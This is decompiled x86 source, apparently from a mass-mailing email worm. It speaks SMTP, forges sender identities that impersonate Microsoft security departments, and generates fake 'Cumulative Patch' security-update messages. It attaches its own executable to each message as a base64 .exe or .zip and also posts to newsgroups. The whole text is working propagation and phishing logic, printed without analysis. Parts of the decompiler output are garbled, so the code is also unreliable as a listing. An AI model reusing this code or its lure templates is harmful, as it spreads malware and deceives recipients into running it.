                *__imp__wsprintfA(ebp + -348, "MAIL FROM: <%s>\r\n", 0x412e10);
                ecx = esi;
                L00401A9E(ebp + -348);
                ecx = esi;
                if(L00401B0D() == 0) {
                    goto L00402047;
                }
                (save)7000;
                (save) *L00412DD4;
                if(*ebx() == edi) {
                    goto L00402047;
                }
                ecx = esi;
                if(L0040AAB0(L00401830(ebp + -348, 3), "250") != 0) {
                    goto L00402047;
                }
                ecx = esi;
                L00401B15( *(ebp + -460));
                ecx = 4302872;
                eax = L00401D8A();
                77 = eax * eax;
                edi = L0040AA95(eax);
                *(ebp + -476) = edi;
                *(ebp - 32) = edi;
                ecx = 4302872;
                ecx = esi;
                L00401A9E(L00401D8E(edi, 1));
                *(ebp + -480) = edi;
                L0040AB34(edi);
                ecx = esi;
                if(L00401B0D() == 0) {
                    goto L00402047;
                }
                eax = *(ebp + -460);
                800 = eax * eax;
                (save)eax + 6000;
                (save) *L00412DD4;
                eax = *ebx();
                edi = 258;
                if(eax == 258) {
                    goto L00402047;
                }
                ecx = esi;
                L00401830(ebp + -348, 4);
                ecx = esi;
                L00401B15(1);
                ecx = esi;
                L00401A9E("DATA\r\n");
                ecx = esi;
                if(L00401B0D() == 0) {
                    goto L00402047;
                }
                (save)7000;
                (save) *L00412DD4;
                if(*ebx() == edi) {
                    goto L00402047;
                }
                ecx = esi;
                if(L0040AAB0(L00401830(ebp + -348, 3), "354") != 0) {
                    goto L00402047;
                }
                edi = L0040AA95(180000);
                *(ebp + -484) = edi;
                *(ebp - 32) = edi;
                if(*(ebp - 36) != 0) {
                    L00402478(edi, 1, 0);
                } else {
                    L00403763(edi);
                }
                ecx = esi;
                L00401A9E(edi);
                ecx = esi;
                if(L00401B0D() == 0) {
                    *(ebp + -488) = edi;
                    L0040AB34();
                    L00402374(1, *(ebp - 36), edi);
                    goto L0040235f;
                }
                (save)200000;
                (save) *L00412DD4;
                *(ebp + -352) = *ebx();
                *(ebp + -492) = edi;
                L0040AB34(edi);
                if(*(ebp + -352) == 258) {
                    goto L00402047;
                }
                ecx = esi;
                if(L0040AAB0(L00401830(ebp + -348, 3), "250") != 0) {
                    goto L00402047;
                }
                ecx = esi;
                L00401A9E("QUIT\r\n");
                (save)1000;
                *__imp__Sleep();
                (save) *(ebp - 36);
                (save)0;
            }
        }
    }
    L00402374();
    (restore)ecx;
    goto L0040235f;
    return(1);
    esp = *(ebp - 24);
L0040235f:
    *(ebp - 4) = *(ebp - 4) | -1;
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
    return(0);
}

stack space not deallocated on return
/*	Procedure: 0x00402374 - 0x00402477
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L00402374(A18)
/* unknown */ void  A18;
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4252512;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 108;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    esi = 0;
    *(ebp - 4) = 0;
    ecx = 0x412f48;
    L004018D3();
    if(*(ebp + 8) != esi || *(ebp + 12) != esi) {
        L0040A0F0(ebp - 124, 0x412f00);
        if(*(ebp + 8) != esi) {
            if(*(ebp + 12) == esi) {
                goto L004023d4;
            }
            (save)"\germs0.dbv";
        } else {
L004023d4:
            (save)"\germs1.dbv";
        }
        (save)ebp - 124;
        L0040A100();
        (restore)ecx;
        ecx = 4302872;
        L00401C5A(ebp - 124);
    }
    ecx = 4302872;
    eax = L00401BE7();
    *L0041A59C = esi;
    goto L00402412;
    return(1);
    esp = *(ebp - 24);
    *L0041A59C = 0;
L00402412:
    *(ebp - 4) = *(ebp - 4) | -1;
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
    return;
    (save)ebx;
    (save)esi;
    (save)edi;
    (save)0;
    esi = *__imp__GetModuleHandleA();
    (save)"CUSTOM";
    (save)A18 & 65535;
    (save)esi;
    edi = *__imp__FindResourceA();
    (save)edi;
    (save)esi;
    (save)edi;
    (save)0;
    ebx = *__imp__SizeofResource();
    eax = *__imp__LoadResource();
    esi = eax;
    if(esi != 0) {
        L0040A630(A18, esi, ebx);
        eax = *__imp__FreeResource(esi);
    }
    (restore)edi;
    (restore)esi;
    (restore)ebx;
}

stack space not deallocated on return
/*	Procedure: 0x00402478 - 0x00403762
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00402478()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4252528;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 1336;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    *(ebp - 4) = 0;
    edi = *(ebp + 8);
    *edi = 0;
    *(ebp + -424) = 0;
    *(ebp + -388) = 0;
    *(ebp + -476) = 0;
    ebx = 10;
    (save)10;
    (save)L00406850() + 7;
    (save)ebp - 68;
    L004068F4();
    (save)ebx;
    (save)L00406850() + 7;
    (save)ebp - 88;
    L004068F4();
    (save)ebx;
    (save)L00406850() + 7;
    (save)ebp - 48;
    L004068F4();
    (save)"FROM: \"";
    (save)edi;
    L0040A100();
    esp = esp + 44;
    if(*(ebp + 12) != 0) {
        if(L00406840(80) != 0) {
            eax = "MS ";
            if(L00406840(50) == 0) {
                eax = "Microsoft ";
            }
            L0040A100();
            if(L00406840(50, ebp + -388, eax) != 0) {
                L0040A100(ebp + -388, "Corporation ");
            }
        }
        (save)4;
        if(L00406840(50) != 0) {
            (restore)ecx;
            if(!(eax = L00406850() - 1)) {
                if(!(eax = eax - 1)) {
                    if(eax = eax - 1) {
                        goto L004025a2;
                    }
                    (save)"Program ";
                } else {
                    (save)"Internet ";
                }
            } else {
                (save)"Network ";
            }
            (save)ebp + -388;
            L0040A100();
            (restore)ecx;
L004025a2:
            L0040A100();
            if(!(eax = L00406850(4, ebp + -388, "Security ") - 1)) {
                if(!(eax = eax - 1)) {
                    if(!(eax = eax - 1)) {
                        if(eax = eax - 1) {
                            goto L0040265f;
                        }
                        (save)"Division";
                    } else {
                        (save)"Section";
                    }
                } else {
                    (save)"Department";
                }
            } else {
                (save)"Center";
            }
        } else {
            (restore)ecx;
            if(!(eax = L00406850() - 1)) {
                if(!(eax = eax - 1)) {
                    if(!(eax = eax - 1)) {
                        if(eax = eax - 1) {
                            goto L00402623;
                        }
                        (save)"Security ";
                    } else {
                        (save)"Technical ";
                    }
                } else {
                    (save)"Public ";
                }
            } else {
                (save)"Customer ";
            }
            (save)ebp + -388;
            L0040A100();
            (restore)ecx;
L00402623:
            if(!(eax = L00406850(4) - 1)) {
                if(!(eax = eax - 1)) {
                    if(!(eax = eax - 1)) {
                        if(eax = eax - 1) {
                            goto L0040265f;
                        }
                        (save)"Bulletin";
                    } else {
                        (save)"Services";
                    }
                } else {
                    (save)"Assistance";
                }
            } else {
                (save)"Support";
            }
        }
        (save)ebp + -388;
        L0040A100();
        (restore)ecx;
L0040265f:
        if(L00406840(9) != 0) {
            L0040A0F0(ebp + -388, "Microsoft");
        }
        if(L00406840(97) == 0) {
            goto L004026f3;
        }
    } else {
        if(*L00412DD8 != 0) {
            (save)0x412dd8;
            goto L004026d6;
        }
        esi = 300;
        *(ebp - 28) = 300;
        (save)ebp - 28;
        (save)ebp + -388;
        if(*__imp__GetUserNameA() == 0) {
            *(ebp - 28) = esi;
            (save)ebp - 28;
            (save)ebp + -388;
            if(*__imp__GetComputerNameA() == 0) {
                (save)"unknown";
L004026d6:
                (save)ebp + -388;
                L0040A0F0();
                (restore)ecx;
            }
        }
    }
    L0040A100(edi, ebp + -388);
L004026f3:
    esi = "\" <";
    (save)esi;
    (save)edi;
    L0040A100();
    (save)ebx;
    (save)L00406850() + 5;
    (save)ebp + -388;
    L004068F4();
    (save)50;
    esp = esp + 24;
    if(L00406840() != 0) {
        eax = "_";
        if(L00406840(50) == 0) {
            eax = "-";
        }
        (save)eax;
        (save)ebp + -388;
        L0040A100();
        (save)5;
        (save)L00406850() + 3;
        (save)ebp + -476;
        (save)L004068F4();
        (save)ebp + -388;
        L0040A100();
        esp = esp + 28;
    }
    L0040A100(ebp + -388, "@");
    ebx = *(ebp + 12);
    if(ebx != 0) {
        eax = L00406850(9) - 1;
        if(eax <= 8) {
            goto *(eax * 4 + 0x40347e)[L004027a4, L004027b9, L004027c0, L004027c7, L004027ce, L004027d5, L004027dc, L004027e3, L004027ea, ]goto ( *(eax * 4 + 0x40347e));
            (save)"newsletters";
L004027a9:
            (save)ebp + -424;
            L0040A0F0();
            (restore)ecx;
            goto L0040282c;
            (save)"support";
            goto L004027a9;
            (save)"technet";
            goto L004027a9;
            (save)"updates";
            goto L004027a9;
            (save)"advisor";
            goto L004027a9;
            (save)"confidence";
            goto L004027a9;
            (save)"bulletin";
            goto L004027a9;
            (save)"news";
            goto L004027a9;
            (save)5;
            (save)L00406850() + 3;
            (save)ebp + -476;
            (save)L004068F4();
            (save)ebp + -424;
            L0040A0F0();
            esp = esp + 20;
        }
    } else {
        (save)3;
        (save)L00406850() + 1 + 1;
        (save)ebp + -424;
        L004068F4();
        esp = esp + 12;
    }
L0040282c:
    if(L00406840(65) != 0 && ebx != 0) {
        eax = ".";
        if(L00406840(80) == 0) {
            eax = "_";
        }
        L0040A100();
        if(eax = L00406850(4, ebp + -424, eax) - 1) {
            goto L0040288a;
        }
        if(eax = eax - 1) {
            goto L00402883;
        }
        if(eax = eax - 1) {
            goto L0040287c;
        }
        if(!(eax = eax - 1)) {
            (save)"msn";
            goto L0040288f;
L0040287c:
            (save)"ms";
            goto L0040288f;
L00402883:
            (save)"microsoft";
            goto L0040288f;
L0040288a:
            (save)"msdn";
L0040288f:
            (save)ebp + -424;
            L0040A100();
            (restore)ecx;
        }
    }
    eax = ".com";
    if(L00406840(70) == 0) {
        eax = ".net";
    }
    (save)eax;
    (save)ebp + -424;
    L0040A100();
    (save)ebp + -424;
    (save)ebp + -388;
    L0040A100();
    (save)7;
    esp = esp + 20;
    if(L00406840() != 0) {
        *(ebp + -388) = 32;
        *(ebp + -387) = 0;
    }
    L0040A100(edi, ebp + -388);
    if(ebx != 0) {
        (save)">\r\nTO: \"";
    } else {
        (save)">\r\nNEWSGROUPS: ";
    }
    (save)edi;
    L0040A100();
    (restore)ecx;
    *(ebp + -388) = 0;
    if(!(eax = L00406850(3) - 1)) {
        if((eax = eax - 1) || L00406840(80) == 0) {
            goto L00402982;
        }
        (save)"Commercial ";
    } else {
        eax = "MS ";
        if(L00406840(50) == 0) {
            eax = "Microsoft ";
        }
        L0040A100();
        if(L00406840(40, ebp + -388, eax) == 0) {
            goto L00402982;
        }
        (save)"Corporation ";
    }
    (save)ebp + -388;
    L0040A100();
    (restore)ecx;
L00402982:
    if(L00406840(37) != 0) {
        (save)"Customer";
    } else {
        if(!(eax = L00406850(4) - 1)) {
            if(!(eax = eax - 1)) {
                if(!(eax = eax - 1)) {
                    if(eax = eax - 1) {
                        goto L004029d1;
                    }
                    (save)"User";
                } else {
                    (save)"Partner";
                }
            } else {
                (save)"Consumer";
            }
        } else {
            (save)"Client";
        }
    }
    (save)ebp + -1308;
    L0040A0F0();
    (restore)ecx;
L004029d1:
    L0040A100();
    if(L00406840(6, ebp + -388, ebp + -1308) != 0) {
        *(ebp + -388) = 32;
        *(ebp + -387) = 0;
    }
    if(ebx == 0 && *(ebp + 16) != ebx) {
        L0040A0F0(ebp + -388, *(ebp + 16));
    }
    L0040A100(edi, ebp + -388);
    if(ebx != 0) {
        (save)esi;
        (save)edi;
        L0040A100();
        *(ebp + -388) = 0;
        (save)50;
        esp = esp + 12;
        if(L00406840() != 0) {
            eax = ebp + -1308;
        } else {
            (save)5;
            (save)L00406850() + 3;
            (save)ebp + -476;
            eax = L004068F4();
            esp = esp + 12;
        }
        L0040A100();
        if(L00406840(80, ebp + -388, eax) != 0) {
            if(!(eax = L00406850(3) - 1)) {
                if(!(eax = eax - 1)) {
                    if(eax = eax - 1) {
                        goto L00402abc;
                    }
                    (save)"-";
                } else {
                    (save)"_";
                }
            } else {
                (save)".";
            }
            (save)ebp + -388;
            L0040A100();
            (restore)ecx;
L00402abc:
            (save)5;
            (save)L00406850() + 5;
            (save)ebp + -476;
            (save)L004068F4();
            (save)ebp + -388;
            L0040A100();
            esp = esp + 20;
        }
        (save)"@";
        (save)ebp + -388;
        L0040A100();
        (save)ebp + -424;
        (save)ebp + -388;
        L0040A100();
        esp = esp + 16;
        (save)ebp + -388;
        *__imp__CharLowerA();
        if(L00406840(5) != 0) {
            *(ebp + -388) = 32;
            *(ebp + -387) = 0;
        }
        L0040A100();
        L0040A100(edi, ">", edi, ebp + -388);
    }
    L0040A100(edi, "\r\nSUBJECT: ");
    *(ebp + -388) = 0;
    if(ebx != 0) {
        if(!(eax = L00406850(6) - 1)) {
            if(!(eax = eax - 1)) {
                if(!(eax = eax - 1)) {
                    if(!(eax = eax - 1)) {
                        if(eax = eax - 1) {
                            goto L00402bae;
                        }
                        (save)"Current ";
                    } else {
                        (save)"Newest ";
                    }
                } else {
                    (save)"Last ";
                }
            } else {
                (save)"New ";
            }
        } else {
            (save)"Latest ";
        }
        (save)ebp + -388;
        L0040A100();
        (restore)ecx;
L00402bae:
        if(!(eax = L00406850(5) - 1)) {
            if(!(eax = eax - 1)) {
                if(!(eax = eax - 1)) {
                    if(eax = eax - 1) {
                        goto L00402bea;
                    }
                    (save)"Net ";
                } else {
                    (save)"Network ";
                }
            } else {
                (save)"Microsoft ";
            }
        } else {
            (save)"Internet ";
        }
        (save)ebp + -388;
        L0040A100();
        (restore)ecx;
L00402bea:
        if(!(eax = L00406850(3) - 1)) {
            if(eax = eax - 1) {
                goto L00402c12;
            }
            (save)"Critical ";
        } else {
            (save)"Security ";
        }
        (save)ebp + -388;
        L0040A100();
        (restore)ecx;
L00402c12:
        if(!(eax = L00406850(4) - 1)) {
            if(!(eax = eax - 1)) {
                if(!(eax = eax - 1)) {
                    if(eax = eax - 1) {
                        goto L00402c4e;
                    }
                    (save)"Patch";
                } else {
                    (save)"Update";
                }
            } else {
                (save)"Pack";
            }
        } else {
            (save)"Upgrade";
        }
        (save)ebp + -388;
        L0040A100();
        (restore)ecx;
L00402c4e:
        if(L00406840(7) != 0) {
            (save)ebp + -388;
            *__imp__CharLowerA();
        }
        if(L00406840(5) != 0) {
            *(ebp + -388) = 32;
            *(ebp + -387) = 0;
        }
    } else {
        if(!(eax = L00406850(12) - 1)) {
            if(!(eax = eax - 1)) {
                if(eax = eax - 1) {
                    goto L00402cbc;
                }
                (save)"RE: ";
            } else {
                (save)"FWD: ";
            }
        } else {
            (save)"FW: ";
        }
        (save)ebp + -388;
        L0040A100();
        (restore)ecx;
L00402cbc:
        eax = L00406850(13) - 1;
        if(eax <= 12) {
            goto *(eax * 4 + 0x4034a2)[L00402cd1, L00402cd8, L00402cdf, L00402ce6, L00402ced, L00402cf4, L00402cfb, L00402d02, L00402d09, L00402d10, L00402d17, L00402d1e, L00402d25, ]goto ( *(eax * 4 + 0x4034a2));
            (save)"Check ";
            goto L00402d2a;
            (save)"Check out ";
            goto L00402d2a;
            (save)"Prove ";
            goto L00402d2a;
            (save)"Taste ";
            goto L00402d2a;
            (save)"Try ";
            goto L00402d2a;
            (save)"Try on ";
            goto L00402d2a;
            (save)"Look at ";
            goto L00402d2a;
            (save)"Take a look at ";
            goto L00402d2a;
            (save)"See ";
            goto L00402d2a;
            (save)"Watch ";
            goto L00402d2a;
            (save)"Use ";
            goto L00402d2a;
            (save)"Apply ";
            goto L00402d2a;
            L0040A100(ebp + -388, "Install ");
        }
        if(L00406840(40) == 0) {
            goto L00402d4b;
        }
        (save)"this ";
        goto L00402d6f;
        if(eax = L00406850(4) - 1) {
            goto L00402d6a;
        }
        if(eax = eax - 1) {
            goto L00402d63;
        }
        if(eax = eax - 1) {
            goto L00402d7d;
        }
        (save)"that ";
        goto L00402d6f;
        (save)"the ";
        goto L00402d6f;
        L0040A100(ebp + -388, "these ");
        if(eax = L00406850(7) - 1) {
            goto L00402dba;
        }
        if(eax = eax - 1) {
            goto L00402db3;
        }
        if(eax = eax - 1) {
            goto L00402dac;
        }
        if(eax = eax - 1) {
            goto L00402da5;
        }
        if(eax = eax - 1) {
            goto L00402d9e;
        }
        if(eax = eax - 1) {
            goto L00402dcd;
        }
        (save)"important ";
        goto L00402dbf;
        (save)"internet ";
        goto L00402dbf;
        (save)"critical ";
        goto L00402dbf;
        (save)"security ";
        goto L00402dbf;
        (save)"corrective ";
        goto L00402dbf;
        L0040A100(ebp + -388, "correction ");
        if(eax = L00406850(4) - 1) {
            goto L00402df6;
        }
        if(eax = eax - 1) {
            goto L00402def;
        }
        if(eax = eax - 1) {
            goto L00402de8;
        }
        if(eax = eax - 1) {
            goto L00402e09;
        }
        (save)"pack";
        goto L00402dfb;
        (save)"package";
        goto L00402dfb;
        (save)"patch";
        goto L00402dfb;
        L0040A100(ebp + -388, "update");
        esi = 60;
        if(L00406840(60) != 0) {
            L0040A100();
            if(L00406840(20, ebp + -388, " ") == 0) {
                goto L00402e9d;
            }
            L0040A100();
            if(L00406840(50, ebp + -388, "for ") == 0) {
                goto L00402e7e;
            }
            eax = "Microsoft ";
            if(L00406840(65) != 0) {
                goto L00402e6f;
            }
            L0040A100(ebp + -388, "MS ");
            eax = "Windows";
            if(L00406840(50) != 0) {
                goto L00402f76;
            }
            eax = "Internet Explorer";
            goto L00402f76;
            if(L00406840(30) == 0) {
                goto L00402ef3;
            }
            eax = "which ";
            if(L00406840(50) != 0) {
                goto L00402ebf;
            }
            L0040A100();
            eax = "came ";
            if(L00406840(50, ebp + -388, "that ") != 0) {
                goto L00402ee4;
            }
            L0040A100(ebp + -388, "comes ");
            L0040A100();
            if(L00406840(esi, ebp + -388, "from ") == 0) {
                goto L00402f24;
            }
            L0040A100(ebp + -388, "the ");
            if(eax = L00406850(3) - 1) {
                goto L00402f43;
            }
            if(eax = eax - 1) {
                goto L00402f3c;
            }
            if(eax = eax - 1) {
                goto L00402f56;
            }
            (save)"MS";
            goto L00402f48;
            (save)"Microsoft";
            goto L00402f48;
            L0040A100(ebp + -388, "M$");
            if(L00406840(esi) != 0) {
                eax = " Corporation";
                if(L00406840(esi) != 0) {
                    goto L00402f76;
                }
                L0040A100(ebp + -388, " Corp.");
            }
        }
    }
    L0040A100(edi, ebp + -388);
    if(*L0041A6D8 == 0) {
        goto L00402fb6;
    }
    L0040A100();
    L0040A100(edi, 0x412e74, edi, "\r\nX-ID: ");
    (save)"\r\nMime-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"";
    (save)edi;
    L0040A100();
    (save)ebp - 68;
    (save)edi;
    L0040A100();
    esi = "\"\r\n\r\n--";
    (save)esi;
    (save)edi;
    L0040A100();
    (save)ebp - 68;
    (save)edi;
    L0040A100();
    (save)"\r\nContent-Type: multipart/related; boundary=\"";
    (save)edi;
    L0040A100();
    (save)ebp - 88;
    (save)edi;
    L0040A100();
    (save)"\";\r\n\ttype=\"multipart/alternative\"\r\n\r\n--";
    (save)edi;
    L0040A100();
    (save)ebp - 88;
    (save)edi;
    L0040A100();
    esp = esp + 64;
    (save)"\r\nContent-Type: multipart/alternative; boundary=\"";
    (save)edi;
    L0040A100();
    (save)ebp - 48;
    (save)edi;
    L0040A100();
    (save)esi;
    (save)edi;
    L0040A100();
    (save)ebp - 48;
    (save)edi;
    L0040A100();
    (save)"\r\nContent-Type: text/plain\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\n";
    (save)edi;
    L0040A100();
    *(ebp + -388) = 0;
    (save)70;
    esp = esp + 44;
    eax = "Microsoft ";
    if(L00406840() == 0) {
    }
    (save)"MS ";
    (save)ebp + -388;
    L0040A100();
    (save)ebp + -1308;
    (save)ebp + -388;
    L0040A100();
    (save)ebp + -388;
    (save)ebp + -1308;
    L0040A0F0();
    (save)ebp + -1308;
    (save)edi;
    L0040A100();
    (save)"\r\n\r\n";
    (save)edi;
    L0040A100();
    esp = esp + 40;
    (save)ebp + -1324;
    *__imp__GetSystemTime();
    (save) *(ebp + -1324);
    (save) *(ebp + -1322);
    (save)ebp + -1276;
    L004034d6();
    (save)ebp + -1276;
    (save)edi;
    L0040A100();
    (save)80;
    esp = esp + 24;
    if(L00406840() == 0) {
        goto L004030f6;
    }
    L00402425(edi, 120);
    if(L00406840(85) == 0) {
        goto L00403142;
    }
    L00402425();
    if(L00406840(70, edi, 121) == 0) {
        goto L00403142;
    }
    (save) *(ebp + -1324) & 65535;
    (save)"Copyright %i Microsoft Corporation.\r\n";
    (save)ebp + -388;
    *__imp__wsprintfA();
    (save)ebp + -388;
    (save)edi;
    L0040A100();
    esp = esp + 20;
    (save)"\r\n--";
    (save)edi;
    L0040A100();
    (save)ebp - 48;
    (save)edi;
    L0040A100();
    (save)"\r\nContent-Type: text/html\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\n";
    (save)edi;
    L0040A100();
    (save)111;
    (save)edi;
    L00402425();
    (save)ebp + -1308;
    (save)edi;
    L0040A100();
    (save)"<BR><BR>\r\n";
    (save)edi;
    L0040A100();
    (save)ebp + -1276;
    (save)edi;
    L0040A100();
    (save)112;
    (save)edi;
    L00402425();
    esp = esp + 64;
    (save) *(ebp + -1324) & 65535;
    (save)"%i";
    (save)ebp + -476;
    *__imp__wsprintfA();
    (save)ebp + -476;
    (save)edi;
    L0040A100();
    (save)113;
    (save)edi;
    L00402425();
    esi = "\r\n\r\n--";
    (save)esi;
    (save)edi;
    L0040A100();
    (save)ebp - 48;
    (save)edi;
    L0040A100();
    (save)"--";
    (save)edi;
    L0040A100();
    esp = esp + 52;
    *(ebp + -392) = 0;
    ebx = "5897421";
    if(*(ebp + -392) >= 2) {
        goto L00403280;
    }
    (save)esi;
    (save)edi;
    L0040A100();
    (save)ebp - 88;
    (save)edi;
    L0040A100();
    (save)"\r\nContent-Type: image/gif\r\nContent-Transfer-Encoding: base64\r\nContent-ID: <";
    (save)edi;
    L0040A100();
    eax = *(ebp + -392);
    if(esp = esp + 24) {
        goto L00403248;
    }
    if(eax = eax - 1) {
        goto L0040325b;
    }
    L0040A100(edi, "6447821");
    *(ebp + -1332) = 115;
    goto L0040325b;
    L0040A100(edi, ebx);
    *(ebp + -1332) = 114;
    L0040A100();
    L00402425(edi, *(ebp + -1332), edi, ">\r\n\r\n");
    *(ebp + -392) = *(ebp + -392) + 1;
    goto L004031f9;
    *(ebp + -392) = 0;
    if(*(ebp + -392) >= 2) {
        goto L0040331d;
    }
    *(ebp + -1344) = edi;
    L004068F4(ebp + -1340, 7);
    eax = ebx;
    if(*(ebp + -392) != 0) {
    }
    (save)"6447821";
    (save)ebp + -1352;
    L0040A0F0();
    (save)ebp + -1352;
    (save)edi;
    eax = L0040A070();
    esp = esp + 16;
    *(ebp + -1344) = eax;
    if(*(ebp + -1344) == 0) {
        goto L00403312;
    }
    (save)7;
    (save)ebp + -1340;
    (save) *(ebp + -1344);
    L0040A460();
    *(ebp + -1344) = *(ebp + -1344) + 1;
    (save)ebp + -1352;
    (save) *(ebp + -1344);
    L0040A070();
    esp = esp + 20;
    goto L004032d7;
    *(ebp + -392) = *(ebp + -392) + 1;
    goto L00403287;
    (save)esi;
    (save)edi;
    L0040A100();
    (save)ebp - 88;
    (save)edi;
    L0040A100();
    (save)"--\r\n\r\n--";
    (save)edi;
    L0040A100();
    (save)ebp - 68;
    (save)edi;
    L0040A100();
    esp = esp + 32;
    if(*(ebp + 12) != 0 || *L00412F38 == 0) {
        goto L0040335a;
    }
    ebx = 1;
    goto L0040335c;
    ebx = 0;
    *(ebp + -1328) = 0;
    L0040A100(edi, "\r\nContent-Type: application/x-");
    eax = "compressed";
    if(ebx != 0) {
        goto L0040337d;
    }
    L0040A100();
    L0040A100(edi, "; name=\"", edi, "msdownload");
    if(ebx == 0 || L00406840(25) == 0) {
        goto L004033c4;
    }
    (save)4;
    (save)L00406850() + 1 + 1;
    (save)ebp + -476;
    (save)L004068F4();
    (save)edi;
    L0040A100();
    esp = esp + 20;
    goto L004033da;
    L0040A100(edi, L004073F8(), ebp + -476);
    if(ebx == 0) {
        goto L0040340a;
    }
    L0040A100();
    *__imp__wsprintfA(ebp + -388, "%s\%s", 0x412f00, 0x412f38, edi, ".zip");
    goto L0040342b;
    L0040A100(edi, ".exe");
    (save)300;
    (save)ebp + -388;
    (save)0;
    *__imp__GetModuleFileNameA();
    (save)"\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment\r\n\r\n";
    (save)edi;
    L0040A100();
    (save)ebp + -388;
    (save)edi;
    L00404411();
    (save)esi;
    (save)edi;
    L0040A100();
    (save)ebp - 68;
    (save)edi;
    L0040A100();
    (save)"--\r\n\r\n.\r\n";
    (save)edi;
    L0040A100();
    esp = esp + 40;
    goto L0040346b;
    return(1);
    esp = *(ebp - 24);
    *(ebp - 4) = *(ebp - 4) | -1;
    *%fs:0x0] = *(ebp - 16);
    (restore)edi;
    (restore)esi;
    (restore)ebx;
    esp = ebp;
    (restore)ebp;
    return(1);
    (save)ebp;
    ebp = esp;
    esp = esp - 52;
    (save)esi;
    esi = *(ebp + 8);
    (save)"this is the latest version of security update, the\r\n\"";
    *esi = 0;
    L0040A100(esi);
    eax = ( *(ebp + 12) & 65535) - 1;
    (restore)ecx;
    if(eax <= 11) {
        goto *(eax * 4 + 0x403733)[L00403501, L00403508, L0040350f, L00403516, L0040351d, L00403524, L0040352b, L00403532, L00403539, L00403540, L00403547, L0040354e, ]goto ( *(eax * 4 + 0x403733));
        (save)"January";
        goto L00403553;
        (save)"February";
        goto L00403553;
        (save)"March";
        goto L00403553;
        (save)"April";
        goto L00403553;
        (save)"May";
        goto L00403553;
        (save)"June";
        goto L00403553;
        (save)"July";
        goto L00403553;
        (save)"August";
        goto L00403553;
        (save)"September";
        goto L00403553;
        (save)"October";
        goto L00403553;
        (save)"November";
        goto L00403553;
        (save)"December";
L00403553:
        (save)esi;
        L0040A100();
        (restore)ecx;
    }
    (save) *(ebp + 16) & 65535;
    (save)" %i, Cumulative Patch\" update which ";
    (save)ebp - 52;
    *__imp__wsprintfA();
    (save)ebp - 52;
    (save)esi;
    L0040A100();
    (save)3;
    esp = esp + 24;
    if(!(eax = L00406850() - 1)) {
        if(!(eax = eax - 1)) {
            if(eax = eax - 1) {
                goto L004035a7;
            }
            (save)"fixes";
        } else {
            (save)"resolves";
        }
    } else {
        (save)"eliminates";
    }
    (save)esi;
    L0040A100();
    (restore)ecx;
L004035a7:
    L0040A100();
    if(L00406840(70, esi, "\r\nall known security vulnerabilities affecting\r\nMS Internet Explorer, MS Outlook and MS Outlook Express") != 0) {
        L0040A100();
        eax = "newly discovered";
        if(L00406840(70, esi, "\r\nas well as three ") == 0) {
            eax = "new";
        }
        L0040A100();
        L0040A100(esi, " vulnerabilities", esi, eax);
    }
    L0040A100();
    if(L00406840(20, esi, ".\r\nInstall now to ") != 0) {
        (save)"continue keeping your computer secure";
    } else {
        if(L00406840(40) != 0) {
            L0040A100(esi, "help ");
        }
        eax = "protect your computer";
        if(L00406840(60) == 0) {
            eax = "maintain the security of your computer";
        }
        (save)eax;
    }
    (save)esi;
    L0040A100();
    (restore)ecx;
    if(L00406840(85) != 0) {
        L0040A100();
        if(L00406840(80, esi, "\r\nfrom these vulnerabilities") != 0) {
            L0040A100();
            eax = "attacker";
            if(L00406840(65, esi, ", the most serious of which could\r\nallow an ") == 0) {
                eax = "malicious user";
            }
            L0040A100();
            L0040A100();
            eax = "executable";
            if(L00406840(50, esi, " to run ", esi, eax) == 0) {
                eax = "code";
            }
            L0040A100();
            L0040A100();
            eax = "system";
            if(L00406840(40, esi, " on your ", esi, eax) == 0) {
                eax = "computer";
            }
            L0040A100(esi, eax);
        }
    }
    L0040A100();
    if(L00406840(95, esi, ".") != 0) {
        L0040A100(esi, "\r\nThis update includes the functionality =\r\nof all previously released patches.");
    }
    eax = L0040A100(esi, "\r\n");
    (restore)esi;
    esp = ebp;
    (restore)ebp;
}

stack space not deallocated on return
/*	Procedure: 0x00403763 - 0x00404369
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00403763()
{



    (save)ebp;
    ebp = esp;
    (save)-1;
    (save)4252544;
    (save)0x40a384;
    (save) *%fs:0x0];
    *%fs:0x0] = esp;
    esp = esp - 672;
    (save)ebx;
    (save)esi;
    (save)edi;
    *(ebp - 24) = esp;
    *(ebp - 4) = 0;
    esi = *(ebp + 8);
    *esi = 0;
    *(ebp + -636) = 0;
    *(ebp + -544) = 0;
    *(ebp - 44) = 0;
    *(ebp + -616) = 0;
    *(ebp + -688) = 0;
    (save)10;
    (save)L00406850() + 5;
    (save)ebp + -616;
    L004068F4();
    (save)"FROM: \"";
    (save)esi;
    L0040A100();
    (save)15;
    esp = esp + 24;
    if(L00406840() != 0) {
        if(!(eax = L00406850(3) - 1)) {
            if(!(eax = eax - 1)) {
                if(eax = eax - 1) {
                    goto L00403905;
                }
                (save)"Admin";
            } else {
                (save)"Administrator";
            }
        } else {
            (save)"Postmaster";
        }
    } else {
        if(L00406840(40) != 0) {
            eax = "Microsoft ";
            if(L00406840(50) == 0) {
                eax = "MS ";
            }
            L0040A100(ebp + -544, eax);
        }
        if(!(eax = L00406850(5) - 1)) {
            if(!(eax = eax - 1)) {
                if(!(eax = eax - 1)) {
                    if(eax = eax - 1) {
                        goto L00403886;
                    }
                    (save)"Inet ";
                } else {
                    (save)"Net ";
                }
            } else {
                (save)"Network ";
            }
        } else {
            (save)"Internet ";
        }
        (save)ebp + -544;
        L0040A100();
